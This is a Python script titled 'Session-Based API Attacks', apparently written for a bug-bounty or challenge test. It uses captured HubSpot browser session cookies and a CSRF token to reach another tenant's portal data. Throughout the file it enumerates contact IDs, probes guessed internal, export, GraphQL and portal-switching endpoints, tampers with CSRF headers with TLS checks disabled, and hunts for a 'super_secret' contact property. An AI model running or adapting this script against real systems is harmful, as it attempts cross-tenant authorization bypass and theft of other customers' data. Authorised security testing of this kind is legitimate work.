#!/usr/bin/env python3
"""
Session-Based API Attacks
Uses browser session cookies to test app.hubspot.com endpoints

Tests:
- Session-based authorization bypass
- CSRF token manipulation
- Portal context in session
- Internal/admin endpoints accessible via browser
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("Session-Based API Attacks")
print("="*80)
print(f"\nCookies length: {len(SESSION_COOKIES) if SESSION_COOKIES else 0}")
print(f"Target portal: {TARGET_PORTAL}")
print("="*80)

if not SESSION_COOKIES:
    print("\nERROR: No session cookies found in .env file!")
    print("Please capture cookies from app.hubspot.com and add to .env")
    exit(1)

findings = []

# Extract CSRF token from cookies if present
csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)
        print(f"CSRF token found: {csrf_token[:30]}...")

# ============================================================================
# 1. APP.HUBSPOT.COM API ENDPOINTS
# ============================================================================

def test_app_hubspot_apis():
    """Test app.hubspot.com internal APIs with session cookies"""
    print("\n[*] Testing app.hubspot.com internal APIs...")

    headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    # Add CSRF token if available
    if csrf_token:
        headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

    # Internal API endpoints
    internal_apis = [
        # Contact APIs
        f'https://app.hubspot.com/api/contacts/v1/contact/vid/1/profile?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/crm/v1/objects/contacts/1?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',

        # Search APIs
        f'https://app.hubspot.com/api/crm/search/contacts?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/contacts/v1/search/query?q=&portalId={TARGET_PORTAL}',

        # List APIs
        f'https://app.hubspot.com/api/contacts/v1/lists/all/contacts/all?count=100&portalId={TARGET_PORTAL}',

        # Portal APIs
        f'https://app.hubspot.com/api/portal/v1/settings?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/portal/{TARGET_PORTAL}',

        # Property APIs
        f'https://app.hubspot.com/api/contacts/v1/properties?portalId={TARGET_PORTAL}',

        # Navigation/sidebar APIs (might leak data)
        f'https://app.hubspot.com/api/navigation/v1/sidebar?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/navigation/v3/sidebar?portalId={TARGET_PORTAL}',
    ]

    for url in internal_apis:
        try:
            endpoint = url.split('.com')[1][:80]
            print(f"\n  {endpoint}")

            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Got data!")

                    # Check for contact data
                    data_str = json.dumps(data).lower()
                    if 'firstname' in data_str or 'email' in data_str or 'contact' in data_str:
                        print(f"  Contains contact data")

                        # Check for super_secret
                        if 'super_secret' in data_str:
                            print(f"  *** FOUND super_secret in response ***")
                            print(f"  Data: {json.dumps(data, indent=2)[:500]}")
                            findings.append({
                                'attack': 'App HubSpot API',
                                'url': url,
                                'data': data
                            })
                        else:
                            print(f"  Data preview: {json.dumps(data, indent=2)[:300]}")
                    else:
                        print(f"  Keys: {list(data.keys())[:10] if isinstance(data, dict) else 'not dict'}")

                except Exception as e:
                    print(f"  Response (not JSON): {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 2. SESSION-BASED CONTACT ACCESS
# ============================================================================

def test_session_contact_access():
    """Try to access contacts using session cookies"""
    print("\n[*] Testing session-based contact access...")

    headers = {
        'Cookie': SESSION_COOKIES,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    if csrf_token:
        headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

    # Try different contact IDs
    contact_ids = [1, 2, 3, 5, 10, 100, 1000]

    for cid in contact_ids:
        # Try multiple URL patterns
        urls = [
            f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{cid}/',
            f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{cid}',
            f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{cid}',
            f'https://app.hubspot.com/api/contacts/v1/contact/vid/{cid}/profile?portalId={TARGET_PORTAL}',
        ]

        for url in urls:
            try:
                r = requests.get(url, headers=headers, verify=False, timeout=5)

                if r.status_code == 200:
                    print(f"\n  Contact {cid} at {url.split('hubspot.com')[1][:50]}")
                    print(f"  Status: {r.status_code}")

                    # Check if HTML page or JSON
                    content_type = r.headers.get('content-type', '')

                    if 'json' in content_type:
                        try:
                            data = r.json()
                            props = data.get('properties', {})

                            print(f"  Properties: {list(props.keys())[:10]}")

                            if 'super_secret' in props:
                                print(f"  *** FOUND super_secret: {props['super_secret']} ***")
                                findings.append({
                                    'attack': 'Session Contact Access',
                                    'contact_id': cid,
                                    'url': url,
                                    'data': data
                                })
                        except:
                            pass
                    elif 'html' in content_type:
                        # Check HTML for data
                        if 'super_secret' in r.text.lower():
                            print(f"  *** HTML contains 'super_secret' ***")
                            # Extract from HTML
                            match = re.search(r'super_secret["\']?\s*[:=]\s*["\']?([^"\'<>,\s]+)', r.text, re.I)
                            if match:
                                value = match.group(1)
                                print(f"  Value: {value}")
                                findings.append({
                                    'attack': 'Session Contact HTML',
                                    'contact_id': cid,
                                    'url': url,
                                    'value': value
                                })

            except Exception as e:
                pass

# ============================================================================
# 3. PORTAL SWITCHING WITH SESSION
# ============================================================================

def test_portal_switching():
    """Test if we can switch portals using session"""
    print("\n[*] Testing portal switching with session...")

    headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    if csrf_token:
        headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

    # Try to switch portal context
    switch_urls = [
        # Portal switcher endpoints
        f'https://app.hubspot.com/api/portal/switch/{TARGET_PORTAL}',
        f'https://app.hubspot.com/api/portal/v1/switch?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/users/v1/app/set-portal?portalId={TARGET_PORTAL}',

        # Session endpoints
        f'https://app.hubspot.com/api/session/v1/portal/{TARGET_PORTAL}',
        f'https://app.hubspot.com/api/session/v1/switch?portalId={TARGET_PORTAL}',
    ]

    for url in switch_urls:
        try:
            print(f"\n  {url.split('.com')[1][:70]}")

            # Try GET
            r = requests.get(url, headers=headers, verify=False, timeout=5)
            print(f"  GET: {r.status_code}")

            if r.status_code == 200:
                print(f"  Response: {r.text[:200]}")

            # Try POST
            r = requests.post(url, headers=headers, json={'portalId': TARGET_PORTAL}, verify=False, timeout=5)
            print(f"  POST: {r.status_code}")

            if r.status_code == 200:
                print(f"  Response: {r.text[:200]}")

                # If successful, try to access contacts in target portal
                test_url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'
                r2 = requests.get(test_url, headers=headers, verify=False, timeout=5)

                if r2.status_code == 200:
                    print(f"  *** Successfully accessed target portal contact! ***")
                    findings.append({
                        'attack': 'Portal Switching',
                        'switch_url': url,
                        'access_url': test_url
                    })

        except Exception as e:
            pass

# ============================================================================
# 4. GRAPHQL WITH SESSION
# ============================================================================

def test_graphql_with_session():
    """Test GraphQL endpoints with session cookies"""
    print("\n[*] Testing GraphQL with session cookies...")

    headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    if csrf_token:
        headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

    graphql_urls = [
        'https://app.hubspot.com/graphql',
        'https://app.hubspot.com/api/graphql',
        f'https://app.hubspot.com/graphql?portalId={TARGET_PORTAL}',
    ]

    query = {
        "query": """
        {
            contact(id: "1") {
                id
                firstname
                email
                properties
            }
        }
        """,
        "variables": {
            "portalId": TARGET_PORTAL
        }
    }

    for url in graphql_urls:
        try:
            print(f"\n  {url.split('.com')[1]}")
            r = requests.post(url, headers=headers, json=query, verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  Response: {json.dumps(data, indent=2)[:300]}")

                    if 'data' in data and 'contact' in str(data):
                        findings.append({
                            'attack': 'GraphQL with Session',
                            'url': url,
                            'data': data
                        })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 5. EXPORT/DOWNLOAD ENDPOINTS
# ============================================================================

def test_export_endpoints():
    """Test data export endpoints that might bypass normal auth"""
    print("\n[*] Testing export/download endpoints...")

    headers = {
        'Cookie': SESSION_COOKIES,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    if csrf_token:
        headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

    export_urls = [
        f'https://app.hubspot.com/api/contacts/v1/lists/all/contacts/all?count=100&portalId={TARGET_PORTAL}&property=firstname&property=super_secret&property=email',
        f'https://app.hubspot.com/api/export/v1/contacts?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/crm/v3/objects/contacts/export?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/export',
    ]

    for url in export_urls:
        try:
            print(f"\n  {url.split('.com')[1][:70]}")
            r = requests.get(url, headers=headers, verify=False, timeout=15)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()

                    # Check for contact data
                    if 'contacts' in data or 'results' in data:
                        contacts = data.get('contacts') or data.get('results', [])
                        print(f"  Got {len(contacts)} contacts")

                        # Check each contact
                        for contact in contacts[:5]:
                            props = contact.get('properties', {})
                            if 'super_secret' in props:
                                print(f"  *** FOUND super_secret: {props['super_secret']} ***")
                                findings.append({
                                    'attack': 'Export Endpoint',
                                    'url': url,
                                    'contact': contact
                                })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 6. CSRF TOKEN MANIPULATION
# ============================================================================

def test_csrf_manipulation():
    """Test if CSRF token can be manipulated"""
    print("\n[*] Testing CSRF token manipulation...")

    base_headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    # Test URL that might require CSRF
    test_url = f'https://app.hubspot.com/api/contacts/v1/contact/vid/1/profile?portalId={TARGET_PORTAL}'

    csrf_tests = [
        {'name': 'No CSRF token', 'headers': {}},
        {'name': 'Wrong CSRF token', 'headers': {'X-HubSpot-CSRF-hubspotapi': 'wrong_token_12345'}},
        {'name': 'Empty CSRF token', 'headers': {'X-HubSpot-CSRF-hubspotapi': ''}},
        {'name': 'Valid CSRF token', 'headers': {'X-HubSpot-CSRF-hubspotapi': csrf_token} if csrf_token else {}},
    ]

    for test in csrf_tests:
        try:
            headers = {**base_headers, **test['headers']}
            print(f"\n  Test: {test['name']}")

            r = requests.get(test_url, headers=headers, verify=False, timeout=5)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Access allowed")

                    if 'properties' in data:
                        props = data.get('properties', {})
                        if 'super_secret' in props:
                            print(f"  *** FOUND super_secret: {props['super_secret']} ***")
                            findings.append({
                                'attack': 'CSRF Bypass',
                                'test': test['name'],
                                'data': data
                            })
                except:
                    pass

        except Exception as e:
            pass

# ============================================================================
# MAIN EXECUTION
# ============================================================================

test_app_hubspot_apis()
test_session_contact_access()
test_portal_switching()
test_graphql_with_session()
test_export_endpoints()
test_csrf_manipulation()

print("\n" + "="*80)
print(f"Session-Based Attack Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** SUCCESSFUL SESSION-BASED ATTACKS ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   {json.dumps(finding, indent=3)[:500]}...")
        print()

    with open('/home/user/Hub/findings/session_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/session_findings.json")
else:
    print("\nNo session-based vulnerabilities found.")
    print("\nThis means:")
    print("  - Session cookies don't bypass API authorization")
    print("  - Portal context enforced even with valid session")
    print("  - CSRF protection working correctly")
    print("  - app.hubspot.com APIs validate portal access")
